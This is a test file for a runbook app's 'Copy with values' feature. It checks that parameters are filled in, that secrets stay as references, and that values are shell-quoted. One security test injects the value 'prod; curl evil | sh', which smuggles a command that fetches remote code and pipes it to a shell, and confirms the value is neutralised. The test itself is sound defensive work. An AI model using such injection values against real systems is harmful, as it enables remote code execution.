/**
 * Copy Line with Values (as VS Code's copyLine): the values a run would use now filled in,
 * secrets left as references; and the line's Copy with values button.
 */
import * as Clipboard from 'expo-clipboard';
import { act, fireEvent, render, screen } from '@testing-library/react-native';
import { LineValues, hasRefs, withValues } from '../runbooks/copyLine';
import { setParamValue } from '../runbooks/params';
import { addRunbook, resetRunbooks } from '../runbooks/store';
import { RunbookView } from '../screens/RunbookView';

jest.mock('expo-router', () => ({
  Link: ({ children }: { children: unknown }) => children,
  Stack: { Screen: () => null },
  router: { push: jest.fn(), back: jest.fn() },
}));
jest.mock('../ssh/transport', () => ({ openTransport: jest.fn(), transportReady: async () => undefined }));

const none: LineValues = { params: {}, defaults: {}, inputs: {}, captures: {} };

describe('withValues', () => {
  it('fills in parameters (typed, else the default), inputs and captured values', () => {
    const v: LineValues = {
      params: { ENV: 'prod', EMPTY: '' },
      defaults: { EMPTY: 'staging', REGION: 'eu' },
      inputs: { USER: { value: 'alice', masked: false } },
      captures: { POD: { name: 'POD', value: 'api-7d9', secret: false } },
    };
    expect(withValues('deploy ${param:ENV} ${param:EMPTY} ${param:REGION} ${input:USER} ${out:POD}', v)).toEqual({
      text: 'deploy prod staging eu alice api-7d9',
      left: [],
    });
  });

  it('never copies a secret: secrets, masked or :secret inputs, inputs named like secrets, secret captures', () => {
    const v: LineValues = {
      params: {},
      defaults: {},
      inputs: {
        PASS: { value: 'hunter2', masked: true },
        PIN: { value: '1234', masked: false },
        API_TOKEN: { value: 'tok', masked: false },
      },
      captures: { KEY: { name: 'KEY', value: 's3cr3t', secret: true } },
    };
    const r = withValues('login ${secret:DB} ${input:PASS} ${input:PIN:secret} ${input:API_TOKEN} ${out:KEY} ${secret:DB}', v);
    expect(r.text).toBe('login ${secret:DB} ${input:PASS} ${input:PIN:secret} ${input:API_TOKEN} ${out:KEY} ${secret:DB}');
    expect(r.text).not.toMatch(/hunter2|1234|tok |s3cr3t/);
    // Each once, in order.
    expect(r.left).toEqual(['${secret:DB}', '${input:PASS}', '${input:PIN:secret}', '${input:API_TOKEN}', '${out:KEY}']);
  });

  it('leaves what isn’t known yet, as it is', () => {
    expect(withValues('echo ${param:ENV} ${input:USER} ${out:POD}', none)).toEqual({
      text: 'echo ${param:ENV} ${input:USER} ${out:POD}',
      left: ['${param:ENV}', '${input:USER}', '${out:POD}'],
    });
    expect(withValues('uptime', none)).toEqual({ text: 'uptime', left: [] });
  });

  it('hasRefs: Copy with values only when there is something to fill in', () => {
    expect(hasRefs('echo ${param:ENV}')).toBe(true);
    expect(hasRefs('echo $HOME ${HOME}')).toBe(false);
  });
});

describe('the line’s Copy button', () => {
  beforeEach(() => {
    resetRunbooks();
    jest.mocked(Clipboard.setStringAsync).mockClear();
  });
  const press = async (id: string): Promise<void> => {
    await act(async () => {
      fireEvent.press(screen.getByTestId(id));
    });
  };

  it('Copy with values: the parameter filled in, the secret left, and says so', async () => {
    const r = addRunbook(
      'c.md',
      '---\nparams:\n  - name: ENV\n    default: staging\n---\n# C\n\n```bash\nuptime\ncurl -H "Authorization: ${secret:TOKEN}" https://${param:ENV}.example.com\n```\n',
    );
    setParamValue(r.id, 'ENV', 'prod');
    await render(<RunbookView id={r.id} />);
    // The first line has nothing to fill in: plain Copy.
    await press('cell-1-line-0');
    expect(screen.getByTestId('cell-1-line-0-copy')).toHaveTextContent(/(^|[^ ])Copy$/);
    await press('cell-1-line-1');
    expect(screen.getByTestId('cell-1-line-1-copy')).toHaveTextContent(/Copy with values$/);
    await press('cell-1-line-1-copy');
    expect(Clipboard.setStringAsync).toHaveBeenLastCalledWith('curl -H "Authorization: ${secret:TOKEN}" https://prod.example.com');
    expect(screen.getByTestId('run-notice')).toHaveTextContent('Copied line 2, left as is: ${secret:TOKEN}');
  });

  it('a value from a link stays one piece of text, quoted for the cell’s shell (security review round 3)', async () => {
    const r = addRunbook(
      'c.md',
      '# C\n\n```bash\nkubectl -n ${param:NS} get pods\n```\n\n```powershell\nWrite-Output ${param:NS}\n```\n\n```cmd\necho ${param:NS}\n```\n',
    );
    setParamValue(r.id, 'NS', 'prod; curl evil | sh');
    await render(<RunbookView id={r.id} />);
    await press('cell-1-line-0');
    await press('cell-1-line-0-copy');
    expect(Clipboard.setStringAsync).toHaveBeenLastCalledWith("kubectl -n 'prod; curl evil | sh' get pods");
    await press('cell-2-line-0');
    await press('cell-2-line-0-copy');
    expect(Clipboard.setStringAsync).toHaveBeenLastCalledWith("Write-Output 'prod; curl evil | sh'");
    // cmd has no quoting that holds: the reference stays, and the notice says so.
    await press('cell-3-line-0');
    await press('cell-3-line-0-copy');
    expect(Clipboard.setStringAsync).toHaveBeenLastCalledWith('echo ${param:NS}');
    expect(screen.getByTestId('run-notice')).toHaveTextContent('Copied line 1, left as is: ${param:NS}');
  });
});
